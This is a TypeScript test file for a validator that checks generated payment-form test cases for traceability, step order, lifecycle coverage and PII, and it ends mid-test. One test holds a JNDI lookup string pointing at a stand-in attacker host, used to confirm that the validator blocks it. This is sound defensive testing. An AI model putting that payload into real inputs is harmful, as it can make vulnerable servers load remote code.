import assert from "node:assert/strict";
import test from "node:test";
import {
  GENERATED_TEST_CASE_SCHEMA_VERSION,
  TEST_INTELLIGENCE_CONTRACT_VERSION,
  TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
  WORKFLOW_TOPOLOGY_SCHEMA_VERSION,
  type BusinessTestIntentIr,
  type GeneratedTestCase,
  type GeneratedTestCaseList,
  type WorkflowTopology,
} from "../contracts/index.js";
import { validateGeneratedTestCases } from "./test-case-validation.js";

const ZERO_HASH =
  "0000000000000000000000000000000000000000000000000000000000000000";
const GENERATED_AT = "2026-04-25T10:00:00.000Z";

const buildIntent = (): BusinessTestIntentIr => ({
  version: "1.0.0",
  source: { kind: "figma_local_json", contentHash: ZERO_HASH },
  screens: [
    {
      screenId: "s-payment",
      screenName: "Payment Details",
      trace: { nodeId: "s-payment" },
    },
  ],
  detectedFields: [
    {
      id: "s-payment::field::n-iban",
      screenId: "s-payment",
      trace: { nodeId: "n-iban" },
      provenance: "figma_node",
      confidence: 0.9,
      label: "IBAN",
      type: "text",
    },
  ],
  detectedActions: [
    {
      id: "s-payment::action::n-submit",
      screenId: "s-payment",
      trace: { nodeId: "n-submit" },
      provenance: "figma_node",
      confidence: 0.9,
      label: "Pay",
      kind: "button",
    },
  ],
  detectedValidations: [
    {
      id: "s-payment::validation::n-iban::Required",
      screenId: "s-payment",
      trace: { nodeId: "n-iban" },
      provenance: "figma_node",
      confidence: 0.85,
      rule: "Required",
      targetFieldId: "s-payment::field::n-iban",
    },
  ],
  detectedNavigation: [],
  inferredBusinessObjects: [],
  risks: [],
  assumptions: [],
  openQuestions: [],
  piiIndicators: [],
  redactions: [],
});

const buildOracleIntent = (): BusinessTestIntentIr => ({
  ...buildIntent(),
  detectedFields: [
    {
      id: "s-payment::field::n-amount",
      screenId: "s-payment",
      trace: { nodeId: "n-amount" },
      provenance: "figma_node",
      confidence: 0.9,
      label: "Amount",
      type: "number",
    },
  ],
  detectedValidations: [
    {
      id: "s-payment::validation::n-amount::range",
      screenId: "s-payment",
      trace: { nodeId: "n-amount" },
      provenance: "figma_node",
      confidence: 0.85,
      rule: "Numeric in range 1000..50000",
      targetFieldId: "s-payment::field::n-amount",
    },
  ],
});

const buildOracleDobIntent = (): BusinessTestIntentIr => ({
  ...buildIntent(),
  detectedFields: [
    {
      id: "s-payment::field::n-dob",
      screenId: "s-payment",
      trace: { nodeId: "n-dob" },
      provenance: "figma_node",
      confidence: 0.9,
      label: "Geburtsdatum",
      type: "date",
    },
  ],
  detectedValidations: [
    {
      id: "s-payment::validation::n-dob::iso-date",
      screenId: "s-payment",
      trace: { nodeId: "n-dob" },
      provenance: "figma_node",
      confidence: 0.85,
      rule: "ISO date",
      targetFieldId: "s-payment::field::n-dob",
    },
  ],
});

const buildCase = (
  overrides: Partial<GeneratedTestCase> = {},
): GeneratedTestCase => ({
  id: "tc-1",
  sourceJobId: "job-1",
  contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
  schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
  promptTemplateVersion: TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
  title: "Pay with valid IBAN",
  objective: "Submit the payment form with a valid IBAN",
  level: "system",
  type: "functional",
  priority: "p1",
  riskCategory: "financial_transaction",
  technique: "use_case",
  preconditions: [],
  testData: ["[REDACTED:IBAN]"],
  steps: [
    { index: 1, action: "Open payment screen" },
    { index: 2, action: "Submit form", expected: "Confirmation displayed" },
  ],
  expectedResults: ["Confirmation displayed"],
  figmaTraceRefs: [{ screenId: "s-payment" }],
  assumptions: [],
  openQuestions: [],
  qcMappingPreview: { exportable: true },
  qualitySignals: {
    coveredFieldIds: ["s-payment::field::n-iban"],
    coveredActionIds: ["s-payment::action::n-submit"],
    coveredValidationIds: [],
    coveredNavigationIds: [],
    confidence: 0.85,
  },
  reviewState: "draft",
  audit: {
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    contractVersion: TEST_INTELLIGENCE_CONTRACT_VERSION,
    schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
    promptTemplateVersion: TEST_INTELLIGENCE_PROMPT_TEMPLATE_VERSION,
    redactionPolicyVersion: "1.0.0",
    visualSidecarSchemaVersion: "1.0.0",
    cacheHit: false,
    cacheKey: "k",
    inputHash: ZERO_HASH,
    promptHash: ZERO_HASH,
    schemaHash: ZERO_HASH,
  },
  ...overrides,
});

const buildList = (
  cases: GeneratedTestCase[] = [buildCase()],
): GeneratedTestCaseList => ({
  schemaVersion: GENERATED_TEST_CASE_SCHEMA_VERSION,
  jobId: "job-1",
  testCases: cases,
});

const buildWorkflowTopology = (): WorkflowTopology => ({
  schemaVersion: WORKFLOW_TOPOLOGY_SCHEMA_VERSION,
  jobId: "job-1",
  actions: [
    {
      actionId: "ACT-001",
      screenId: "s-payment",
      label: "Submit form",
      kind: "confirm_state",
      targetIds: ["s-payment::action::n-submit"],
      sourceRefs: ["figma-node:n-submit"],
    },
  ],
  states: [
    {
      stateId: "STATE-001",
      screenId: "s-payment",
      label: "Payment form visible",
      sourceRefs: ["figma-screen:s-payment"],
    },
    {
      stateId: "STATE-002",
      screenId: "s-payment",
      label: "Payment submitted",
      sourceRefs: ["figma-node:n-submit"],
    },
  ],
  transitions: [
    {
      transitionId: "TRANS-001",
      from: "STATE-001",
      to: "STATE-002",
      guard: "Submit is activated",
      actions: ["ACT-001"],
    },
  ],
  fieldLifecycles: [],
  entryStates: ["STATE-001"],
  exitStates: ["STATE-002"],
});

const buildFieldLifecycleWorkflowTopology = (): WorkflowTopology => ({
  ...buildWorkflowTopology(),
  fieldLifecycles: [
    {
      fieldId: "s-payment::field::n-iban",
      states: [
        "initial",
        "focused",
        "in_progress",
        "validated",
        "error",
        "terminal",
      ],
      transitions: [
        {
          transitionId: "FLT-iban0001",
          from: "initial",
          to: "focused",
          trigger: "user_focus",
        },
        {
          transitionId: "FLT-iban0002",
          from: "focused",
          to: "in_progress",
          trigger: "user_input",
        },
        {
          transitionId: "FLT-iban0003",
          from: "in_progress",
          to: "validated",
          trigger: "validation_pass",
        },
        {
          transitionId: "FLT-iban0004",
          from: "in_progress",
          to: "error",
          trigger: "validation_fail",
        },
        {
          transitionId: "FLT-iban0005",
          from: "validated",
          to: "terminal",
          trigger: "form_commit",
        },
      ],
    },
  ],
});

test("Issue #2071: validator rejects oracle-governed testData that lacks deterministic provenance", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    intent: buildOracleIntent(),
    list: buildList([
      buildCase({
        id: "tc-oracle-1",
        title: "Submit valid amount",
        objective: "Submit the form with a valid amount",
        testData: ["Amount: 4242.00"],
        qualitySignals: {
          coveredFieldIds: ["s-payment::field::n-amount"],
          coveredActionIds: [],
          coveredValidationIds: [],
          coveredNavigationIds: [],
          confidence: 0.9,
        },
      }),
    ]),
  });
  assert.equal(
    report.issues.some((issue) => issue.code === "test_data_oracle_violation"),
    true,
  );
});

test("Issue #2106: validator keeps preserved entries scannable while skipping the oracle-governed synthetic slot", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    intent: buildOracleDobIntent(),
    list: buildList([
      buildCase({
        id: "tc-oracle-dob-1",
        title: "Submit valid date of birth",
        objective: "Submit the form with a valid date of birth",
        testData: [
          "Comment: jane.doe@example.com",
          'Geburtsdatum: 2026-04-25 (format_valid; from rule "ISO date")',
        ],
        qualitySignals: {
          coveredFieldIds: ["s-payment::field::n-dob"],
          coveredActionIds: [],
          coveredValidationIds: [],
          coveredNavigationIds: [],
          confidence: 0.9,
        },
      }),
    ]),
  });
  assert.equal(
    report.issues.some(
      (issue) =>
        issue.code === "test_data_pii_detected" &&
        issue.path === "$.testCases[0].testData[0]",
    ),
    true,
    JSON.stringify(report.issues, null, 2),
  );
  assert.equal(
    report.issues.some(
      (issue) =>
        issue.code === "test_data_pii_detected" &&
        issue.path === "$.testCases[0].testData[1]",
    ),
    false,
  );
  assert.equal(
    report.issues.some((issue) => issue.code === "test_data_oracle_violation"),
    true,
  );
});

test("valid input produces a clean report", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList(),
    intent: buildIntent(),
  });
  assert.equal(report.errorCount, 0, JSON.stringify(report.issues, null, 2));
  assert.equal(report.warningCount, 0);
  assert.equal(report.blocked, false);
  assert.equal(report.totalTestCases, 1);
});

test("workflow topology ACT ids are accepted as coveredActionIds", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        qualitySignals: {
          coveredFieldIds: ["s-payment::field::n-iban"],
          coveredActionIds: ["ACT-001"],
          coveredValidationIds: [],
          coveredNavigationIds: [],
          confidence: 0.85,
        },
      }),
    ]),
    intent: buildIntent(),
    workflowTopology: buildWorkflowTopology(),
  });
  assert.equal(report.blocked, false, JSON.stringify(report.issues, null, 2));
  assert.ok(
    report.issues.every(
      (issue) =>
        !(
          issue.code === "quality_signals_coverage_unknown_id" &&
          issue.path?.endsWith("coveredActionIds")
        ),
    ),
  );
});

test("field lifecycle transitions require step anchors and mandatory-tier coverage", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList(),
    intent: buildIntent(),
    workflowTopology: buildFieldLifecycleWorkflowTopology(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some(
      (issue) => issue.code === "missing_field_lifecycle_transition",
    ),
  );
  // Wave-A audit follow-up (2026-05-11): only the two realistic
  // validation-outcome transitions (in_progress→validated and
  // in_progress→error) MUST produce blocking errors. The legacy
  // initial→focused entry transition is demoted to recommended because
  // P0 multi-dataset benchmarks showed it over-firing on real
  // generator output that anchors via initial→in_progress instead.
  const errorTransitionIssues = report.issues.filter(
    (issue) => issue.code === "uncovered_field_lifecycle_transition",
  );
  assert.equal(errorTransitionIssues.length, 2);
  assert.ok(errorTransitionIssues.every((issue) => issue.severity === "error"));
  // The three recommended_positive_path transitions (initial→focused,
  // focused→in_progress, validated→terminal) must surface as warnings.
  const recommendedIssues = report.issues.filter(
    (issue) =>
      issue.code === "uncovered_field_lifecycle_transition_recommended",
  );
  assert.equal(recommendedIssues.length, 3);
  assert.ok(recommendedIssues.every((issue) => issue.severity === "warning"));
});

test("Issue #2168: recommended-tier uncovered transitions surface as non-blocking warnings", () => {
  // Build a list whose single case anchors only the three mandatory
  // transitions, leaving focused→in_progress and validated→terminal
  // uncovered. The legacy validator would have blocked this run; the
  // tier-aware validator must keep `blocked === false` and surface the
  // gap as warnings on `warningCount`.
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        id: "tc-mandatory-only",
        steps: [
          {
            index: 1,
            action: "Focus IBAN field",
            fieldLifecycleTransitionId: "FLT-iban0001",
          },
          {
            index: 2,
            action: "Trigger validation success",
            expected: "Confirmation displayed",
            fieldLifecycleTransitionId: "FLT-iban0003",
          },
          {
            index: 3,
            action: "Trigger validation failure",
            expected: "Validation error displayed",
            fieldLifecycleTransitionId: "FLT-iban0004",
          },
        ],
      }),
    ]),
    intent: buildIntent(),
    workflowTopology: buildFieldLifecycleWorkflowTopology(),
  });
  assert.equal(report.blocked, false, JSON.stringify(report.issues, null, 2));
  assert.equal(report.errorCount, 0);
  const warnings = report.issues.filter(
    (issue) =>
      issue.code === "uncovered_field_lifecycle_transition_recommended",
  );
  assert.equal(warnings.length, 2);
  assert.ok(warnings.every((issue) => issue.severity === "warning"));
  assert.ok(report.warningCount >= 2);
});

test("Issue #2168: state_transition_test_only transitions are silent unless a state_transition case is present", () => {
  const baseTopology = buildFieldLifecycleWorkflowTopology();
  const baseLifecycle = baseTopology.fieldLifecycles[0];
  assert.ok(baseLifecycle !== undefined);
  // Inject a reset transition (terminal → initial) — purely
  // state_transition_test_only territory.
  const topologyWithResetTransition: WorkflowTopology = {
    ...baseTopology,
    fieldLifecycles: [
      {
        ...baseLifecycle,
        transitions: [
          ...baseLifecycle.transitions,
          {
            transitionId: "FLT-iban0099",
            from: "terminal",
            to: "initial",
            trigger: "user_focus",
          },
        ],
      },
    ],
  };
  const stepsCoveringEverythingExceptReset = [
    {
      index: 1,
      action: "Focus IBAN field",
      fieldLifecycleTransitionId: "FLT-iban0001",
    },
    {
      index: 2,
      action: "Enter IBAN",
      fieldLifecycleTransitionId: "FLT-iban0002",
    },
    {
      index: 3,
      action: "Validation passes",
      expected: "Confirmation displayed",
      fieldLifecycleTransitionId: "FLT-iban0003",
    },
    {
      index: 4,
      action: "Validation fails",
      expected: "Validation error displayed",
      fieldLifecycleTransitionId: "FLT-iban0004",
    },
    {
      index: 5,
      action: "Submit form",
      expected: "Confirmation displayed",
      fieldLifecycleTransitionId: "FLT-iban0005",
    },
  ];

  const silentReport = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        id: "tc-no-state-transition",
        technique: "use_case",
        steps: stepsCoveringEverythingExceptReset,
      }),
    ]),
    intent: buildIntent(),
    workflowTopology: topologyWithResetTransition,
  });
  assert.equal(silentReport.blocked, false);
  assert.equal(
    silentReport.issues.some((issue) => issue.message.includes("FLT-iban0099")),
    false,
    "state_transition_test_only transition must stay silent when no state_transition case is present",
  );

  const promotedReport = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        id: "tc-state-transition",
        technique: "state_transition",
        steps: stepsCoveringEverythingExceptReset,
      }),
    ]),
    intent: buildIntent(),
    workflowTopology: topologyWithResetTransition,
  });
  assert.equal(promotedReport.blocked, false);
  const stateTransitionWarnings = promotedReport.issues.filter(
    (issue) =>
      issue.code === "uncovered_field_lifecycle_transition_recommended" &&
      issue.message.includes("FLT-iban0099"),
  );
  assert.equal(stateTransitionWarnings.length, 1);
  assert.equal(stateTransitionWarnings[0]?.severity, "warning");
});

test("Epic #2167 Q0: mandatory tier aggregates at (screenId, trigger) — one covered field unblocks the whole screen", () => {
  // P0 → Q0 root cause: the legacy per-(field × transition) check
  // demanded one anchored test step for every (field × mandatory
  // transition) pair, which is mathematically impossible on
  // multi-section banking masks. xr6Nf saw 43 errors on Q0 for a
  // 31-field screen × 2 mandatory triggers (validation_pass +
  // validation_fail) — 62 required anchors vs. 23 generator-produced
  // test-steps. The new aggregation groups by (screenId, trigger);
  // one anchored step on any field of the screen covers the trigger
  // for all similar fields on that screen.
  //
  // This regression pin builds a topology with two fields on the
  // same screen, anchors validation_pass + validation_fail on the
  // FIRST field only, and asserts the validator emits 0 errors
  // (it would have emitted 2 errors for the second field's
  // uncovered transitions under the pre-Q0 behaviour).
  const topology: WorkflowTopology = {
    ...buildWorkflowTopology(),
    fieldLifecycles: [
      {
        fieldId: "s-payment::field::n-iban",
        states: [
          "initial",
          "focused",
          "in_progress",
          "validated",
          "error",
          "terminal",
        ],
        transitions: [
          {
            transitionId: "FLT-iban-A1",
            from: "initial",
            to: "in_progress",
            trigger: "user_input",
          },
          {
            transitionId: "FLT-iban-A2",
            from: "in_progress",
            to: "validated",
            trigger: "validation_pass",
          },
          {
            transitionId: "FLT-iban-A3",
            from: "in_progress",
            to: "error",
            trigger: "validation_fail",
          },
        ],
      },
      {
        fieldId: "s-payment::field::n-amount",
        states: [
          "initial",
          "focused",
          "in_progress",
          "validated",
          "error",
          "terminal",
        ],
        transitions: [
          {
            transitionId: "FLT-amt-B1",
            from: "initial",
            to: "in_progress",
            trigger: "user_input",
          },
          {
            transitionId: "FLT-amt-B2",
            from: "in_progress",
            to: "validated",
            trigger: "validation_pass",
          },
          {
            transitionId: "FLT-amt-B3",
            from: "in_progress",
            to: "error",
            trigger: "validation_fail",
          },
        ],
      },
    ],
  };
  const report = validateGeneratedTestCases({
    jobId: "job-2167-aggregation",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        id: "tc-aggregation",
        steps: [
          {
            index: 1,
            action: "Enter IBAN",
            fieldLifecycleTransitionId: "FLT-iban-A1",
          },
          {
            index: 2,
            action: "Trigger validation pass on IBAN",
            expected: "Confirmation displayed",
            fieldLifecycleTransitionId: "FLT-iban-A2",
          },
          {
            index: 3,
            action: "Trigger validation fail on IBAN",
            expected: "Validation error displayed",
            fieldLifecycleTransitionId: "FLT-iban-A3",
          },
        ],
      }),
    ]),
    intent: buildIntent(),
    workflowTopology: topology,
  });
  const mandatoryErrors = report.issues.filter(
    (issue) => issue.code === "uncovered_field_lifecycle_transition",
  );
  assert.equal(
    mandatoryErrors.length,
    0,
    `Epic #2167 Q0 regression guard: (screen, trigger) aggregation must produce 0 errors when each trigger is covered on any field; got ${mandatoryErrors.length}: ${JSON.stringify(mandatoryErrors.map((e) => e.message))}`,
  );
});

test("Epic #2167 Q0: mandatory tier emits ONE error per (screenId, trigger) group when no transition in the group is anchored", () => {
  // Companion to the previous pin: when a screen has 2 fields with
  // 2 mandatory triggers each (validation_pass + validation_fail) but
  // the generator did NOT anchor any validation_pass or
  // validation_fail steps, the validator must emit exactly TWO
  // errors (one per trigger group), not four (one per field ×
  // transition). The error message must reference the screen and
  // trigger so an auditor can locate the gap.
  const topology: WorkflowTopology = {
    ...buildWorkflowTopology(),
    fieldLifecycles: [
      {
        fieldId: "s-screen::field::n-1",
        states: [
          "initial",
          "focused",
          "in_progress",
          "validated",
          "error",
          "terminal",
        ],
        transitions: [
          {
            transitionId: "FLT-1A",
            from: "in_progress",
            to: "validated",
            trigger: "validation_pass",
          },
          {
            transitionId: "FLT-1B",
            from: "in_progress",
            to: "error",
            trigger: "validation_fail",
          },
        ],
      },
      {
        fieldId: "s-screen::field::n-2",
        states: [
          "initial",
          "focused",
          "in_progress",
          "validated",
          "error",
          "terminal",
        ],
        transitions: [
          {
            transitionId: "FLT-2A",
            from: "in_progress",
            to: "validated",
            trigger: "validation_pass",
          },
          {
            transitionId: "FLT-2B",
            from: "in_progress",
            to: "error",
            trigger: "validation_fail",
          },
        ],
      },
    ],
  };
  const report = validateGeneratedTestCases({
    jobId: "job-2167-no-anchors",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        id: "tc-no-anchors",
        // No steps anchor any mandatory transition.
        steps: [
          {
            index: 1,
            action: "Just focus the field",
            expected: "Field is focused",
          },
        ],
      }),
    ]),
    intent: buildIntent(),
    workflowTopology: topology,
  });
  const mandatoryErrors = report.issues.filter(
    (issue) => issue.code === "uncovered_field_lifecycle_transition",
  );
  assert.equal(
    mandatoryErrors.length,
    2,
    `Epic #2167 Q0 regression guard: 2 fields × 2 triggers must aggregate to 2 errors (one per trigger group), not 4; got ${mandatoryErrors.length}`,
  );
  assert.ok(
    mandatoryErrors.every((err) => err.message.includes('screen "s-screen"')),
    "error messages must name the screen",
  );
  assert.ok(
    mandatoryErrors.some((err) => err.message.includes('"validation_pass"')) &&
      mandatoryErrors.some((err) => err.message.includes('"validation_fail"')),
    "must surface both validation_pass and validation_fail trigger groups",
  );
});

test("field lifecycle transitions pass when every transition is covered by generated steps", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        id: "tc-pos",
        type: "functional",
        steps: [
          {
            index: 1,
            action: "Focus IBAN field",
            fieldLifecycleTransitionId: "FLT-iban0001",
          },
          {
            index: 2,
            action: "Enter IBAN",
            fieldLifecycleTransitionId: "FLT-iban0002",
          },
          {
            index: 3,
            action: "Validate IBAN",
            expected: "Confirmation displayed",
            fieldLifecycleTransitionId: "FLT-iban0003",
          },
          {
            index: 4,
            action: "Submit form",
            expected: "Confirmation displayed",
            fieldLifecycleTransitionId: "FLT-iban0005",
          },
        ],
      }),
      buildCase({
        id: "tc-neg",
        type: "negative",
        qualitySignals: {
          coveredFieldIds: ["s-payment::field::n-iban"],
          coveredActionIds: [],
          coveredValidationIds: ["s-payment::validation::n-iban::Required"],
          coveredNavigationIds: [],
          confidence: 0.85,
        },
        steps: [
          {
            index: 1,
            action: "Focus IBAN field",
            fieldLifecycleTransitionId: "FLT-iban0001",
          },
          {
            index: 2,
            action: "Leave IBAN empty",
            fieldLifecycleTransitionId: "FLT-iban0002",
          },
          {
            index: 3,
            action: "Trigger validation",
            expected: "Validation error displayed",
            fieldLifecycleTransitionId: "FLT-iban0004",
          },
        ],
        expectedResults: ["Validation error displayed"],
      }),
    ]),
    intent: buildIntent(),
    workflowTopology: buildFieldLifecycleWorkflowTopology(),
  });
  assert.equal(report.blocked, false, JSON.stringify(report.issues, null, 2));
});

test("structural schema failures short-circuit semantic checks", () => {
  const list = { schemaVersion: "wrong", jobId: "", testCases: "not-array" };
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: list as unknown as GeneratedTestCaseList,
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.length >= 2);
  assert.ok(report.issues.every((i) => i.code === "schema_invalid"));
});

test("missing trace is blocking", () => {
  const tc = buildCase({ figmaTraceRefs: [] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  const codes = report.issues.map((i) => i.code);
  assert.ok(codes.includes("missing_trace"));
});

test("trace screen unknown is blocking", () => {
  const tc = buildCase({ figmaTraceRefs: [{ screenId: "s-other" }] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "trace_screen_unknown"));
});

test("missing expected results is blocking", () => {
  const tc = buildCase({
    expectedResults: [],
    steps: [
      { index: 1, action: "Open payment screen" },
      { index: 2, action: "Submit form" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "missing_expected_results"));
});

test("expected results may live on a step", () => {
  const tc = buildCase({
    expectedResults: [],
    steps: [
      { index: 1, action: "Open" },
      { index: 2, action: "Submit", expected: "Receipt rendered" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, false);
});

test("PII in test data is blocking even when value looks innocuous", () => {
  const tc = buildCase({ testData: ["jane.doe@example.com"] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "test_data_pii_detected"));
});

test("redaction tokens in test data are accepted", () => {
  const tc = buildCase({
    testData: ["[REDACTED:IBAN]", "[REDACTED:EMAIL]"],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, false);
});

test("semantic suspicious content in exported step data is blocking", () => {
  const tc = buildCase({
    steps: [
      {
        index: 1,
        action: "Open payment screen",
        data: "${jndi:ldap://attacker.example/a}",
        expected: "Form is visible",
      },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some(
      (i) =>
        i.code === "semantic_suspicious_content" &&
        i.path === "$.testCases[0].steps[0].data",
    ),
  );
});

test("PII in preconditions is blocking", () => {
  const tc = buildCase({ preconditions: ["Use IBAN DE89370400440532013000"] });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "preconditions_pii_detected"));
});

test("steps must be ordered and sequential", () => {
  const tc = buildCase({
    steps: [
      { index: 2, action: "Submit" },
      { index: 1, action: "Open" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  const codes = report.issues.map((i) => i.code);
  assert.ok(codes.includes("steps_unordered"));
});

test("step indices must form contiguous 1..N", () => {
  const tc = buildCase({
    steps: [
      { index: 1, action: "Open" },
      { index: 3, action: "Submit", expected: "OK" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "steps_indices_non_sequential"),
  );
});

test("duplicate step index is reported", () => {
  const tc = buildCase({
    steps: [
      { index: 1, action: "Open" },
      { index: 1, action: "Submit", expected: "OK" },
    ],
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "duplicate_step_index"));
});

test("qc mapping with exportable=false requires blocking reasons", () => {
  const tc = buildCase({
    qcMappingPreview: { exportable: false },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "qc_mapping_blocking_reasons_missing"),
  );
});

test("qc mapping exportable=true with blocking reasons is inconsistent", () => {
  const tc = buildCase({
    qcMappingPreview: {
      exportable: true,
      blockingReasons: ["leftover from a prior run"],
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "qc_mapping_exportable_inconsistent"),
  );
});

test("ambiguity with auto_approved review state is rejected", () => {
  const tc = buildCase({
    reviewState: "auto_approved",
    qualitySignals: {
      coveredFieldIds: [],
      coveredActionIds: [],
      coveredValidationIds: [],
      coveredNavigationIds: [],
      confidence: 0.9,
      ambiguity: { reason: "visual disagreed with figma label" },
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some((i) => i.code === "ambiguity_without_review_state"),
  );
});

test("exact validation details are rejected when the source marks the rule unresolved", () => {
  const intent = buildIntent();
  intent.detectedFields[0] = {
    ...intent.detectedFields[0]!,
    label: "VAT rate",
  };
  intent.detectedValidations[0] = {
    ...intent.detectedValidations[0]!,
    rule: "Validation rules for amount fields and VAT selection still need to be specified.",
    targetFieldId: "s-payment::field::n-iban",
  };
  intent.openQuestions = [
    "Validation rules for amount fields and VAT selection still need to be specified.",
  ];
  const tc = buildCase({
    title: "Reject invalid VAT rate",
    objective: "Reject values greater than 0%",
    expectedResults: ["VAT rate is required"],
    qualitySignals: {
      coveredFieldIds: ["s-payment::field::n-iban"],
      coveredActionIds: [],
      coveredValidationIds: ["s-payment::validation::n-iban::Required"],
      coveredNavigationIds: [],
      confidence: 0.85,
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent,
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some(
      (issue) => issue.code === "unsupported_unresolved_validation_detail",
    ),
  );
});

test("generic unresolved validation notes do not block unrelated specified validations", () => {
  const intent = buildIntent();
  intent.openQuestions = ["Validation rules still need to be specified."];
  const tc = buildCase({
    title: "IBAN required validation",
    objective: "Confirm the required validation is shown for IBAN.",
    expectedResults: ["IBAN is required"],
    qualitySignals: {
      coveredFieldIds: ["s-payment::field::n-iban"],
      coveredActionIds: [],
      coveredValidationIds: ["s-payment::validation::n-iban::Required"],
      coveredNavigationIds: [],
      confidence: 0.85,
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent,
  });
  assert.equal(report.blocked, false, JSON.stringify(report.issues, null, 2));
  assert.equal(
    report.issues.some(
      (issue) => issue.code === "unsupported_unresolved_validation_detail",
    ),
    false,
  );
});

test("empty-input validation assumptions are rejected when the source marks the rule unresolved", () => {
  const intent = buildIntent();
  intent.detectedFields[0] = {
    ...intent.detectedFields[0]!,
    label: "VAT rate",
  };
  intent.detectedValidations[0] = {
    ...intent.detectedValidations[0]!,
    rule: "Validation rules for amount fields and VAT selection still need to be specified.",
    targetFieldId: "s-payment::field::n-iban",
  };
  const tc = buildCase({
    title: "Reject empty VAT rate",
    objective: "Confirm the form rejects an empty VAT rate.",
    steps: [
      { index: 1, action: "Open payment screen" },
      { index: 2, action: "Leave VAT rate empty" },
      { index: 3, action: "Submit form" },
    ],
    expectedResults: [
      "A validation response is shown according to the specified validation concept.",
    ],
    qualitySignals: {
      coveredFieldIds: ["s-payment::field::n-iban"],
      coveredActionIds: [],
      coveredValidationIds: ["s-payment::validation::n-iban::Required"],
      coveredNavigationIds: [],
      confidence: 0.85,
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent,
  });
  assert.equal(report.blocked, true);
  assert.ok(
    report.issues.some(
      (issue) => issue.code === "unsupported_unresolved_validation_detail",
    ),
  );
});

test("label-only unresolved validation references downgrade to clarification warnings", () => {
  const intent = buildIntent();
